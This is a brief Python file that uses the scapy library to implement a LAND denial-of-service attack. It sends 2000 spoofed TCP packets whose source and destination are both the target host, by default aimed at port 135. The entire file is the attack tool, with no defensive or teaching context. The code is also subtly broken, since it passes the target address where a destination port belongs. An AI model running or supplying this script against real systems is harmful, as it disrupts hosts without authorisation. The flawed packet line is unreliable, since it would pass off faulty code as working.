from scapy.all import IP, TCP, send


class Land(object):
    def __init__(self, target, port=135):
        self.target = target
        self.port = port

    def launch(self, count=2000):
        send(IP(src=self.target, dst=self.target)/TCP(sport=self.port, dport=self.target), count=count)
